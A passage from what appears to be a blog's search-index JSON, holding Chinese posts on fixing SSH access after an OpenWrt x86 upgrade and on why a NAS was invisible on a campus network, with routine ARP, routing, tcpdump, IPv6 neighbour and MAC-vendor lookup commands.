<li>\u4e0d\u5305\u542b/etc/init.d/\uff0c\u56e0\u6b64lxc dnsmasq jail\u7684\u95ee\u9898\u8fd8\u5728</li> <li>\u4e0d\u5305\u542b/root\uff0c\u56e0\u6b64\u9700\u8981\u6dfb\u52a0</li> </ul> </li> </ul> </li> <li>pve\u4f7f\u7528rootfs\u955c\u50cf\u521b\u5efa\u4e00\u4e2a\u4e34\u65f6\u7684lxc\u5bb9\u5668</li> <li>\uff08\u9002\u7528\u4e8eZFS\uff09\u5c06\u539f\u672c\u5bb9\u5668\u7684disk rename\uff08\u5907\u4efd\uff09\uff0c\u7528\u65b0\u5bb9\u5668\u7684disk\u66ff\u4ee3</li> </ol>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#\u9047\u5230\u95ee\u9898","title":"\u9047\u5230\u95ee\u9898","text":"","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#ssh-permission-denied-publickey","title":"ssh Permission denied (publickey)","text":"<p>\u65e0\u6cd5ssh\u8fde\u63a5 <pre><code>debug1: Next authentication method: publickey\ndebug1: Offering public key: /home/yfy/.ssh/id_rsa RSA SHA256:z9yheNzateaIikTVkTXN1lmMPRIsp+H0ssbhU4Q8Kfg\ndebug1: Authentications that can continue: publickey\ndebug1: No more authentication methods to try.\nroot@192.168.35.1: Permission denied (publickey).\n</code></pre></p> <p>dropbear\u65e5\u5fd7 <pre><code>Mon Oct 30 19:11:11 2023 authpriv.info dropbear[34648]: Child connection from 192.168.35.5:15786\nMon Oct 30 19:11:11 2023 authpriv.info dropbear[34648]: /etc/dropbear must be owned by user or root, and not writable by others\nMon Oct 30 19:11:11 2023 authpriv.info dropbear[34648]: Exit before auth from &lt;192.168.35.5:15786&gt;: (user 'root', 0 fails): Exited normally\n</code></pre></p> <p>\u89e3\u51b3 <pre><code>chmod 750 /etc/dropbear\n</code></pre></p>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#\u53c2\u8003","title":"\u53c2\u8003","text":"<ul> <li>\u5b98\u65b9wiki\uff1a[OpenWrt Wiki] OpenWrt on x86 hardware (PC / VM / server)</li> <li>Upgrade version (x86) - Installing and Using OpenWrt - OpenWrt Forum</li> </ul>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E5%8D%9A%E5%AE%A2/2023/11/21/2023-11-21-NAS%E6%97%A0%E6%B3%95%E6%89%AB%E6%8F%8F%E5%88%B0%E6%B6%89%E5%8F%8A%E7%9A%84%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/","title":"NAS\u65e0\u6cd5\u626b\u63cf\u5230\u6d89\u53ca\u7684\u7f51\u7edc\u77e5\u8bc6","text":"","tags":["\u7f51\u7edc","arp"]},{"location":"%E5%8D%9A%E5%AE%A2/2023/11/21/2023-11-21-NAS%E6%97%A0%E6%B3%95%E6%89%AB%E6%8F%8F%E5%88%B0%E6%B6%89%E5%8F%8A%E7%9A%84%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#\u80cc\u666f","title":"\u80cc\u666f","text":"<p>tsj\u7684NAS\u63d2\u5899\u4e0a\u7f51\u53e3\uff0c\u7b14\u8bb0\u672c\u540c\u6837\u63d2\u5899\u4e0a\u7f51\u53e3\uff0c\u7136\u540e\u4f7f\u7528NAS\u5b98\u65b9\u5de5\u5177\u626b\u63cf\u4e0d\u5230\u8bbe\u5907\u3002\u7531\u4e8e\u626b\u63cf\u4e0d\u5230\u8bbe\u5907\u6240\u4ee5\u4e0d\u77e5\u9053\u8bbe\u5907ip\uff0c\u4e5f\u5c31\u65e0\u6cd5\u8fdb\u4e00\u6b65\u914d\u7f6e\u3002</p> <p>\u90a3\u4e48\u662f\u4ec0\u4e48\u539f\u56e0\u5bfc\u81f4\u626b\u63cf\u4e0d\u5230\u5462\uff0c\u7167\u7406\u6765\u8bf4\uff0cNAS\u548c\u7b14\u8bb0\u672c\u5e94\u8be5\u63a5\u5728\u540c\u4e00\u4e2a\u4ea4\u6362\u673a\u4e0b\uff0c\u7406\u5e94\u662f\u4e92\u901a\u7684\u3002\u5728\u7814\u7a76\u8be5\u95ee\u9898\u8fc7\u7a0b\u4e2d\uff0c\u67e5\u7f3a\u8865\u6f0f\u4e86\u5f88\u591a\u7f51\u7edc\u77e5\u8bc6\uff0c\u7279\u8bb0\u5f55\u3002</p> <p>\u7591\u95ee\u4e00\uff1a\u5b66\u6821\u4e3a\u4f55\u63d2\u5728\u76f8\u90bb\u5899\u4e0a\u7684\u7f51\u53e3\u7684\u673a\u5668\u5206\u914d\u5230\u4e0d\u540c\u7f51\u6bb5\u7684ip\uff1f\u6bd4\u5982114.xxx\u548c210.xxx \u7591\u95ee\u4e8c\uff1a\u5bbf\u820d\u8def\u7531\u5668\u67e5\u770bwan\u53e3\u90bb\u5c45\u8868\uff0c\u4e3a\u4f55\u4e0d\u540cip\u7684mac\u5730\u5740\u662f\u76f8\u540c\u7684\uff1f</p>","tags":["\u7f51\u7edc","arp"]},{"location":"%E5%8D%9A%E5%AE%A2/2023/11/21/2023-11-21-NAS%E6%97%A0%E6%B3%95%E6%89%AB%E6%8F%8F%E5%88%B0%E6%B6%89%E5%8F%8A%E7%9A%84%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#\u7591\u95ee\u4e00\u5b66\u6821\u4e3a\u4f55\u63d2\u5728\u76f8\u90bb\u5899\u4e0a\u7684\u7f51\u53e3\u7684\u673a\u5668\u5206\u914d\u5230\u4e0d\u540c\u7f51\u6bb5\u7684ip\u6bd4\u5982114xxx\u548c210xxx","title":"\u7591\u95ee\u4e00\uff1a\u5b66\u6821\u4e3a\u4f55\u63d2\u5728\u76f8\u90bb\u5899\u4e0a\u7684\u7f51\u53e3\u7684\u673a\u5668\u5206\u914d\u5230\u4e0d\u540c\u7f51\u6bb5\u7684ip\uff1f\u6bd4\u5982114.xxx\u548c210.xxx","text":"<p>\u9996\u5148\u601d\u8003\u4e0d\u540c\u7f51\u6bb5\u548c\u4f4d\u4e8e\u540c\u4e00\u4e2a\u4ea4\u6362\u673a\u4e0b\u51b2\u7a81\u5417\uff1f</p> <p>\u5176\u5b9e\u4e0d\u51b2\u7a81\uff0c\u539f\u56e0\u662fip\u662f\u4e09\u5c42\u7684\u6982\u5ff5\uff0c\u53ea\u8981ip\u5305\u80fd\u591f\u6b63\u786e\u9001\u5230\u76ee\u7684\u5730\u5740\u5373\u53ef\uff0c\u5e76\u4e0d\u5173\u5fc3\u5e95\u5c42\u662f\u76f4\u63a5\u53d1\u9001\u7684\uff0c\u8fd8\u662f\u7ecf\u8fc7\u8def\u7531\u7684\uff08\u7ecf\u8fc7\u8def\u7531\u65f6\u6bcf\u4e00\u8df3mac\u5730\u5740\u90fd\u4f1a\u53d8\u5316\uff09</p> <p>\u8bbe\u5907\u8bbf\u95ee\u76f8\u540c\u7f51\u6bb5\u548c\u4e0d\u540c\u7f51\u6bb5\u5730\u5740\u65f6\u7684\u884c\u4e3a\u662f\u4e0d\u540c\u7684 - \u76f8\u540c\u7f51\u6bb5\u65f6\uff0c\u7cfb\u7edf\u901a\u5e38\u5df2\u7ecf\u6709\u8be5\u7f51\u6bb5\u7684\u8def\u7531\u4e86\uff0c\u56e0\u6b64\u4f1a\u5c1d\u8bd5\u5f80\u5bf9\u5e94\u63a5\u53e3\u53d1\u9001arp\u8bf7\u6c42\uff0c\u8bf7\u6c42\u76ee\u7684\u5730\u5740\u7684mac\u5730\u5740\u3002arp\u8bf7\u6c42\u6210\u529f\u540e\uff0c\u5219\u5f80\u5bf9\u5e94\u63a5\u53e3\u53d1\u9001\u62a5\u6587\uff0c\u5982\u679carp\u5931\u8d25\uff08\u6bd4\u5982\u7aef\u53e3\u9694\u79bb\u65f6\uff09\uff0c\u5219\u4f1aicmp\u62a5\u9519\u3002 - \u5982\u679c\u4f4d\u4e8e\u4e0d\u540c\u7f51\u6bb5\uff0c\u5219\u4f1a\u5339\u914d\u9ed8\u8ba4\u8def\u7531\u3002\u6b64\u65f6\u8bbe\u5907\u9700\u8981\u5c06\u5305\u53d1\u9001\u7ed9\u7f51\u5173\u8f6c\u53d1\uff0c\u56e0\u6b64\u5b9e\u9645\u4f1a\u53d1\u9001arp\u8bf7\u6c42\u7f51\u5173\u7684mac\u5730\u5740</p> <p>\u867d\u7136\u7f51\u6bb5\u4e0d\u540c\uff0c\u5bfc\u81f4\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u65e0\u6cd5\u76f4\u63a5\u76f8\u4e92\u8bbf\u95ee\u3002\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u624b\u52a8\u8bbe\u7f6e\u8def\u7531\u8868\uff0c\u4f7f\u5f97\u5b83\u4eec\u76f4\u63a5\u76f8\u4e92\u8bbf\u95ee\u3002</p> <p>\u9996\u5148\u53ef\u4ee5\u6d4b\u8bd5\u4e24\u4e2a\u8bbe\u5907\u786e\u5b9e\u5c5e\u4e8e\u4e00\u4e2a\u5e7f\u64ad\u57df\uff0c\u5982\u53d1\u9001arp\u8bf7\u6c42\u662f\u53ef\u4ee5\u5f97\u5230\u54cd\u5e94\u7684\u3002 <pre><code>root@op1 \u279c  ~ arping -I br-wan  202.38.78.82\nARPING 202.38.78.82 from 114.214.236.72 br-wan\nUnicast reply from 202.38.78.82 [00:11:32:B2:3F:D9]  0.897ms\nUnicast reply from 202.38.78.82 [00:11:32:B2:3F:D9]  0.827ms\n</code></pre> \u4f46\u662f\u7531\u4e8e\u4e0d\u4f4d\u4e8e\u76f8\u540c\u7f51\u6bb5\uff0c\u6240\u4ee5\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u8bbf\u95ee\u9700\u8981\u7ecf\u8fc7\u4e09\u5c42\u8f6c\u53d1\u3002 <pre><code>root@op1 \u279c  ~ traceroute 202.38.78.82\ntraceroute to 202.38.78.82 (202.38.78.82), 30 hops max, 46 byte packets\n 1  114.214.236.254 (114.214.236.254)  0.427 ms  0.361 ms  0.354 ms\n 2  202.38.78.82 (202.38.78.82)  0.353 ms  0.253 ms  0.235 ms\n</code></pre></p> <p>\u63a5\u7740\u6211\u4eec\u53ef\u4ee5\u624b\u52a8\u6dfb\u52a0\u8def\u7531\u8868\uff0c\u8fd9\u91cc\u4e0d\u6307\u5b9avia\u8868\u793a\u4f4d\u4e8e\u540c\u4e00\u4e2a\u5e7f\u64ad\u57df <pre><code>root@op1 \u279c  ~ ip ro add 202.38.78.82 dev br-wan\n</code></pre></p> <p>\u7136\u540e\u518d\u5c1d\u8bd5ping 202.38.78.82\u3002\u53ef\u4ee5\u6293\u53d6\u5230\u8bbe\u5907\u9996\u5148\u5c1d\u8bd5\u83b7\u5f97202.38.78.82\u7684mac\u5730\u5740\uff0c\u53d1\u51faarp\u8bf7\u6c42 <pre><code>root@op1 \u279c  ~ tcpdump -e -ni br-wan arp and ether host 00:16:3e:e2:4e:72\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on br-wan, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n17:53:21.197964 00:16:3e:e2:4e:72 &gt; ff:ff:ff:ff:ff:ff, ethertype ARP (0x0806), length 42: Request who-has 202.38.78.82 tell 114.214.236.72, length 28\n17:53:21.198395 00:11:32:b2:3f:d9 &gt; 00:16:3e:e2:4e:72, ethertype ARP (0x0806), length 60: Reply 202.38.78.82 is-at 00:11:32:b2:3f:d9, length 46\n</code></pre></p> <p>\u83b7\u5f97mac\u5730\u5740\u540e\uff0c\u8bbe\u5907\u76f4\u63a5\u76f4\u63a5\u53d1\u9001\u7ed9\u5bf9\u5e94\u8bbe\u5907\uff08\u76ee\u7684mac\u662f\u8bbe\u5907\uff0c\u800c\u4e0d\u662f\u7f51\u5173\uff09 - \u8fd9\u91cc\u6709\u610f\u601d\u7684\u662freply\u7684src mac\u5730\u5740\u5176\u5b9e\u662f\u5b66\u6821\u7f51\u5173\u7684\u5730\u5740\u3002\u8fd9\u662f\u56e0\u4e3a\u5bf9\u9762\u673a\u5668\u6536\u5230ip\u5305\u540e\uff0c\u5e76\u4e0d\u4f1a\u5728\u610f\u4e8c\u5c42\u662f\u600e\u4e48\u4f20\u8fc7\u6765\u7684\uff0c\u4ea7\u751f\u54cd\u5e94ip\u5305\u540e\uff0c\u8fd8\u662f\u6309\u7167\u539f\u672c\u6d41\u7a0b\u53d1\u9001\u3002 <pre><code>root@op1 \u279c  ~ tcpdump -e -ni br-wan icmp and host 202.38.78.82\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on br-wan, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n17:53:47.761041 00:16:3e:e2:4e:72 &gt; 00:11:32:b2:3f:d9, ethertype IPv4 (0x0800), length 98: 114.214.236.72 &gt; 202.38.78.82: ICMP echo request, id 53752, seq 0, length 64\n17:53:47.761502 e8:78:ee:13:cc:01 &gt; 00:16:3e:e2:4e:72, ethertype IPv4 (0x0800), length 98: 202.38.78.82 &gt; 114.214.236.72: ICMP echo reply, id 53752, seq 0, length 64\n17:53:48.761083 00:16:3e:e2:4e:72 &gt; 00:11:32:b2:3f:d9, ethertype IPv4 (0x0800), length 98: 114.214.236.72 &gt; 202.38.78.82: ICMP echo request, id 53752, seq 1, length 64\n17:53:48.761326 e8:78:ee:13:cc:01 &gt; 00:16:3e:e2:4e:72, ethertype IPv4 (0x0800), length 98: 202.38.78.82 &gt; 114.214.236.72: ICMP echo reply, id 53752, seq 1, length 64\n</code></pre></p> <p>\u81f3\u4e8e\u5b66\u6821\u662f\u5982\u4f55dhcp\u5206\u914d\u5730\u5740\u7684\uff0c\u901a\u5e38\u662f\u6839\u636e\u8be5\u680b\u697c\u7684\u8bbe\u5907\u6570\u76ee\uff0c\u914d\u7f6e\u597d\u5730\u5740\u6c60\uff0c\u7136\u540e\u968f\u673a\u4ece\u5730\u5740\u6c60\u4e2d\u5206\u914dip\u3002</p>","tags":["\u7f51\u7edc","arp"]},{"location":"%E5%8D%9A%E5%AE%A2/2023/11/21/2023-11-21-NAS%E6%97%A0%E6%B3%95%E6%89%AB%E6%8F%8F%E5%88%B0%E6%B6%89%E5%8F%8A%E7%9A%84%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#\u7591\u95ee\u4e8c\u5bbf\u820d\u8def\u7531\u5668ip-neigh-wan\u53e3\u4e3a\u4f55\u4e0d\u540cip\u7684mac\u5730\u5740\u662f\u76f8\u540c\u7684","title":"\u7591\u95ee\u4e8c\uff1a\u5bbf\u820d\u8def\u7531\u5668ip neigh wan\u53e3\uff0c\u4e3a\u4f55\u4e0d\u540cip\u7684mac\u5730\u5740\u662f\u76f8\u540c\u7684\uff1f","text":"<p>\u53ef\u4ee5\u53d1\u73b0\u5bbf\u820d\u8def\u7531\u5668neigh\u7684mac\u5730\u5740\u90fd\u662f\u76f8\u540c\u7684 <pre><code>root@op2 \u279c  ~ ip neigh |grep eth0\n114.214.175.254 dev eth0 lladdr 5c:dd:70:91:72:e2 DELAY\n114.214.173.13 dev eth0 lladdr 5c:dd:70:91:72:e2 STALE\n114.214.172.86 dev eth0 lladdr 5c:dd:70:91:72:e2 STALE\n114.214.172.87 dev eth0 lladdr 5c:dd:70:91:72:e2 STALE\n</code></pre></p> <p>\u5b9e\u9645\u4e0a\u5bbf\u820d\u7684\u7f51\u7edc\u7ed3\u6784\u662f\u6bd4\u8f83\u590d\u6742\u7684 - \u53ef\u80fd\u6bcf\u4e00\u5c42\u6709\u4e00\u4e2a\u4ea4\u6362\u673a\uff0c\u8fde\u63a5\u5230\u6574\u680b\u697c\u7684\u4ea4\u6362\u673a\u3002 - \u5bbf\u820d\u7684\u6bcf\u4e2a\u5899\u4e0a\u7684\u7aef\u53e3\u90fd\u662fvlan\u9694\u79bb\u7684     - \u4e5f\u5c31\u662f\u4e8c\u5c42\u4e0a\u8bbe\u5907\u95f4\u662f\u65e0\u6cd5\u63a5\u6536\u5230\u5bf9\u65b9\u7684\u7f51\u7edc\u5305\u7684\uff0c\u800c\u4e0d\u50cf\u4e00\u4e2a\u5e7f\u64ad\u57df\u4e2d\uff0c\u5e7f\u64ad\u5305\u6240\u6709\u8bbe\u5907\u90fd\u80fd\u6536\u5230     - vlan id 12bit\u7684\u9650\u5236\u53ef\u80fd\u4e0d\u591f\u7528\uff0c\u56e0\u6b64\u8fd9\u91cc\u8fd8\u6d89\u53ca\u5230q in q\u7684\u6280\u672f     - \u9694\u79bb\u7684\u76ee\u7684\u4e3b\u8981\u662f\u4e3a\u4e86\u964d\u4f4e\u5e7f\u64ad\u98ce\u66b4 - \u8fd8\u6709BRAS\u8bbe\u5907\u8d1f\u8d23\u9274\u6743\u4ee5\u53ca\u8def\u7531</p> <p>\u90a3\u4e48\u4f60\u53ef\u80fd\u597d\u5947\uff0c\u5982\u679c\u5bbf\u820d\u697c\u6709\u4e24\u53f0\u8bbe\u5907\u4f4d\u4e8e\u540c\u4e00\u4e2a\u7f51\u6bb5\uff0c\u5b83\u4eec\u76f8\u4e92\u8bbf\u95ee\u4f1a\u53d1\u751f\u4ec0\u4e48\uff1f\uff08\u4e0d\u540c\u7f51\u6bb5\u5176\u5b9e\u548c\u4e0a\u8282\u7684\u60c5\u51b5\u4e00\u6837\uff0c\u90fd\u9700\u8981\u901a\u8fc7\u7f51\u5173\u8f6c\u53d1\uff09 \u5f53\u8bbe\u5907A\u8bbf\u95ee\u8bbe\u5907B\u65f6\uff0c\u7531\u4e8e\u540c\u4e00\u4e2a\u7f51\u6bb5\uff0c\u6240\u4ee5\u4f1a\u5c1d\u8bd5ARP\u83b7\u5f97\u8bbe\u5907B\u7684mac\u5730\u5740\u3002\u4f46\u662f\u7531\u4e8eA\uff0cB\u4e8c\u5c42\u9694\u79bb\uff0cB\u6536\u4e0d\u5230arp\u8bf7\u6c42\u3002\u4e5f\u5c31\u662fA\u65e0\u6cd5\u83b7\u5f97B\u7684mac\u5730\u5740\u3002</p> <p>\u4f46\u662f\u795e\u5947\u7684\u662f\uff0c\u5b66\u6821\u7684\u4ea4\u6362\u673a\u8bbe\u5907C\u5f00\u542f\u4e86\u4ee3\u7406ARP\uff0c\u6b64\u65f6\u5b66\u6821\u8bbe\u5907\u4f1a\u201c\u6b3a\u9a97\u201dA\uff0c\u8bf4\u5730\u5740B\u7684mac\u5730\u5740\u662fC\u3002\u4e8e\u662fA\u5c31\u4f1a\u628a\u5305\u53d1\u7ed9C\u4e86\uff0cC\u518d\u6839\u636e\u76ee\u7684ip\u53d1\u9001\u7ed9B\u3002 \u4e0a\u8ff0\u8fc7\u7a0b\u548cA\u5c06\u5305\u53d1\u7ed9\u7f51\u5173\uff0c\u7f51\u5173\u5728\u8f6c\u53d1\u7ed9B\u57fa\u672c\u662f\u4e00\u6837\u7684\u3002\u53ea\u4e0d\u8fc7\u5728A\u770b\u6765\u4ee5\u4e3a\u662f\u76f4\u63a5\u53d1\u9001\u7ed9\u4e86B\u3002\u8fd9\u91cc\u4e5f\u518d\u6b21\u9a8c\u8bc1\u4e86\u90a3\u53e5\u8bdd\uff0c\u4e09\u5c42\u5e76\u4e0d\u5728\u610f\u4e8c\u5c42\u662f\u600e\u4e48\u53d1\u7684\uff0c\u53ea\u8981\u5305\u6700\u7ec8\u80fd\u5230\u6b63\u786e\u7684\u5730\u65b9\u5373\u53ef\u3002</p> <p>\u4e86\u89e3\u4ee3\u7406\u5730\u5740\u89e3\u6790\u534f\u8bae(ARP) - Cisco - \u8bbe\u5907\u914d\u7f6e\u4e86172.16.10.100/16\uff0c\u63a9\u7801\u76f8\u5f53\u4e8e\u544a\u8bc9\u8bbe\u5907\u80fd\u591f\u8bbf\u95ee172.16.0.0/16\u6574\u4e2a\u7f51\u6bb5\u3002\u8bbf\u95ee\u8be5\u7f51\u6bb5\u65f6\u4f1a\u76f4\u63a5\u53d1\u9001arp\u8bf7\u6c42\u3002</p>","tags":["\u7f51\u7edc","arp"]},{"location":"%E5%8D%9A%E5%AE%A2/2023/11/21/2023-11-21-NAS%E6%97%A0%E6%B3%95%E6%89%AB%E6%8F%8F%E5%88%B0%E6%B6%89%E5%8F%8A%E7%9A%84%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#nas\u65e0\u6cd5\u626b\u63cf\u539f\u56e0","title":"NAS\u65e0\u6cd5\u626b\u63cf\u539f\u56e0","text":"<p>\u626b\u63cf\u8f6f\u4ef6\u7684\u539f\u7406\uff08\u731c\u6d4b\uff09 - \u8bbe\u5907\u7684MAC\u5730\u5740\u662f\u5df2\u77e5\u7684\uff0c\u5e76\u4e14\u6bcf\u4e2a\u5382\u5546\u90fd\u6709\u5355\u72ec\u7684vendor id\u3002\u56e0\u6b64\u53ea\u8981\u83b7\u5f97\u5b50\u7f51\u6240\u6709\u8bbe\u5907\u7684mac\uff0c\u7136\u540e\u5339\u914d\u5230\u8bbe\u5907\u5373\u53ef - \u4e3a\u4e86\u63a2\u6d4b\u5b50\u7f51\u5185\u6240\u6709\u8bbe\u5907MAC\uff0c\u53ef\u4ee5\u5148\u5411\u5b50\u7f51\u53d1\u9001\u4e00\u4e2a\u5e7f\u64ad\u6d88\u606f\uff0c\u6bd4\u5982192.168.1.255/24 - \u5e7f\u64ad\u540eARP\u8868\u4fbf\u5305\u542b\u4e86\u6240\u6709\u7684\u90bb\u5c45</p> <p>\u800c\u6211\u4eec\u9047\u5230\u626b\u63cf\u4e0d\u5230\u7684\u539f\u56e0\u5728\u4e8e\u7b14\u8bb0\u672c\u548cNAS\u901a\u8fc7\u5b66\u6821dhcp\u83b7\u5f97\u7684ip\u5730\u5740\u4e0d\u662f\u540c\u4e00\u4e2a\u7f51\u6bb5\uff0c\u800c\u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b\u5230\u7684ARP\u6d88\u606f\u5982\u679c\u5730\u5740\u4e0d\u5728\u4e00\u4e2a\u7f51\u6bb5\uff0c\u90a3\u4e48\u662f\u4e0d\u4f1a\u66f4\u65b0arp\u8868\u7684\u3002</p> <p>\u901a\u8fc7tcpdump\u53ef\u4ee5\u6293\u5230\u5f88\u591a\u4e0d\u5728\u540c\u4e00\u7f51\u6bb5\u7684ARP\u8bf7\u6c42\uff0c\u4f46\u662f\u53ef\u4ee5\u53d1\u73b0ip neigh\u53ea\u5305\u542b\u540c\u4e00\u7f51\u6bb5\u7684\u8bbe\u5907 <pre><code>root@op1 \u279c  ~ tcpdump -e -ni br-wan arp\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on br-wan, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n19:22:00.638083 58:11:22:a4:37:23 &gt; ff:ff:ff:ff:ff:ff, ethertype ARP (0x0806), length 60: Request who-has 210.45.76.56 tell 210.45.76.239, length 46\n19:22:01.623857 58:11:22:a4:37:23 &gt; ff:ff:ff:ff:ff:ff, ethertype ARP (0x0806), length 60: Request who-has 210.45.76.56 tell 210.45.76.239, length 46\n19:22:02.084291 24:69:68:a6:27:05 &gt; ff:ff:ff:ff:ff:ff, ethertype ARP (0x0806), length 60: Request who-has 202.38.78.179 tell 202.38.78.138, length 46\n19:22:02.217667 f0:2f:74:dc:8a:df &gt; ff:ff:ff:ff:ff:ff, ethertype ARP (0x0806), length 60: Request who-has 202.38.78.116 tell 202.38.78.208, length 46\n19:22:02.622637 58:11:22:a4:37:23 &gt; ff:ff:ff:ff:ff:ff, ethertype ARP (0x0806), length 60: Request who-has 210.45.76.56 tell 210.45.76.239, length 46\n</code></pre></p>","tags":["\u7f51\u7edc","arp"]},{"location":"%E5%8D%9A%E5%AE%A2/2023/11/21/2023-11-21-NAS%E6%97%A0%E6%B3%95%E6%89%AB%E6%8F%8F%E5%88%B0%E6%B6%89%E5%8F%8A%E7%9A%84%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#ipv6\u5e7f\u64ad\u5e76\u7ed3\u5408mac-oui\u67e5\u8be2\u8bbe\u5907","title":"ipv6\u5e7f\u64ad\u5e76\u7ed3\u5408MAC OUI\u67e5\u8be2\u8bbe\u5907","text":"<p>\u7531\u4e8eipv6\u6709\u4e13\u95e8\u7528\u4e8e\u8868\u793alink scope\u7684\u5730\u5740<code>fe80</code>\uff0c\u4e0d\u5b58\u5728\u50cfipv4\u4e0d\u5904\u4e8e\u540c\u4e00\u4e2a\u7f51\u6bb5\u7684\u60c5\u51b5\u3002\u56e0\u6b64ipv6\u7684\u5e7f\u64ad\u80fd\u591f\u63a2\u6d4b\u5e7f\u64ad\u57df\u4e0a\u7684\u6240\u6709\u8bbe\u5907\uff08\u81ea\u5df1\u7684\u7406\u89e3\uff0c\u4e0d\u4e25\u8c28\u8fd8\u8bf7\u6307\u6b63\uff09 \u6211\u4eec\u53ea\u9700\u8981ping\u4e0bipv6\u7684\u5e7f\u64ad\u5730\u5740 <pre><code>root@op1 \u279c  ~ ping ff02::1%br-wan\n</code></pre></p> <p>\u7136\u540e\u5c31\u4f1a\u53d1\u73b0ipv6\u7684neighbor\u6570\u91cf\u4e00\u4e0b\u5b50\u53d8\u5f97\u5f88\u5927\uff08\u5c1d\u8bd5\u5728\u4e24\u53f0\u4e0d\u540c\u8bbe\u5907\u4e0a\uff0c\u90fd\u5f97\u5230\u4e86\u975e\u5e38\u63a5\u8fd1\u7684\u6570\u5b57\uff09\uff0c\u5e76\u4e14\u4e5f\u77ac\u95f4\u63a2\u6d4b\u51fa\u4e86\u5b9e\u9a8c\u5ba4\u7684\u4e24\u53f0\u7fa4\u6656 <pre><code>root@op1 \u279c  ~ ip -6 n |grep br-wan |wc -l\n247\nroot@op1 \u279c  ~ ip -6 n |grep br-wan |grep 3f:d9\nfe80::211:32ff:feb2:3fd9 dev br-wan lladdr 00:11:32:b2:3f:d9 DELAY\nroot@op1 \u279c  ~ ip -6 n |grep br-wan |grep b3e9\nfe80::9209:d0ff:fe00:b3e9 dev br-wan lladdr 90:09:d0:00:b3:e9 PROBE\n</code></pre></p> <p>\u6709\u4e86mac\u5730\u5740\u540e\uff0c\u6211\u4eec\u80fd\u4e0d\u80fd\u81ea\u52a8\u89e3\u6790\u8bbe\u5907\u578b\u53f7\u5462</p> <p>The first half of the six octets represent the Organizational Unique Identifier (OUI) and the other half is the Network Interface Controller (NIC) which is unique for every device in the world.</p> <p>\u53ef\u4ee5\u4f7f\u7528OUI\u6570\u636e\u5e93\u67e5\u8be2 Command-line tool to obtain OUI vendor info from MAC address? - Unix &amp; Linux Stack Exchange <pre><code>wget \"http://standards-oui.ieee.org/oui.txt\"\n\nping ff02::1%vmbr0\nip -6 n |grep vmbr0 | awk '{print $5}' | tee ip6-neigh.log  #\u83b7\u5f97\u6240\u6709\u90bb\u5c45\u7684mac\u5730\u5740\n\nfor m in $(tr -d ':' &lt; ip6-neigh.log | grep -o '^......'); do grep -iF \"$m\" oui.txt; done |tee mac_vendor.log  # \u5bf9\u6bcf\u4e2amac\u67e5\u8be2\u6570\u636e\u5e93\n</code></pre></p>","tags":["\u7f51\u7edc","arp"]},{"location":"%E5%8D%9A%E5%AE%A2/2023/11/21/2023-11-21-NAS%E6%97%A0%E6%B3%95%E6%89%AB%E6%8F%8F%E5%88%B0%E6%B6%89%E5%8F%8A%E7%9A%84%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#netdiscover\u81ea\u52a8\u63a2\u6d4b\u8bbe\u5907","title":"netdiscover\u81ea\u52a8\u63a2\u6d4b\u8bbe\u5907","text":"<p>netdiscover | Kali Linux Tools netdiscover\u4e5f\u662f\u9488\u5bf9\u4e0a\u8ff0\u9700\u6c42\uff0c\u53ef\u4ee5\u63a2\u6d4b\u5c40\u57df\u7f51\u5185\u8bbe\u5907\u3002</p> <p>netdiscover\u57fa\u4e8eARP\uff0c\u80fd\u591f\u6355\u6349ARP\u8bf7\u6c42\uff08\u4e3b\u52a8\u626b\u63cf\u53d1\u8d77\u6216\u8005\u88ab\u52a8\u63a2\u6d4b\uff09\uff0c\u5e76\u4e14\u89e3\u6790mac\u5730\u5740\u8bbe\u5907\u4fe1\u606f <pre><code>netdiscover -p -i vmbr0  # -p \u8868\u793a\u88ab\u52a8\u6a21\u5f0f\n</code></pre> - \u4f46\u662f\u4e0d\u77e5\u9053\u4e3a\u4f55\u7fa4\u6656\u7684IP\u662f0.0.0.0     - \u624b\u52a8ping\u4e0b\u7fa4\u6656ip\u540e\uff0cnetdiscover\u53c8\u53ef\u4ee5\u6293\u5230\u5730\u5740 </p>","tags":["\u7f51\u7edc","arp"]},{"location":"%E5%8D%9A%E5%AE%A2/2023/11/21/2023-11-21-NAS%E6%97%A0%E6%B3%95%E6%89%AB%E6%8F%8F%E5%88%B0%E6%B6%89%E5%8F%8A%E7%9A%84%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#\u53c2\u8003","title":"\u53c2\u8003","text":"<p>Find Device or IP Address with MAC Address - Command-line &amp; Tools! (pcwdld.com) - arp - 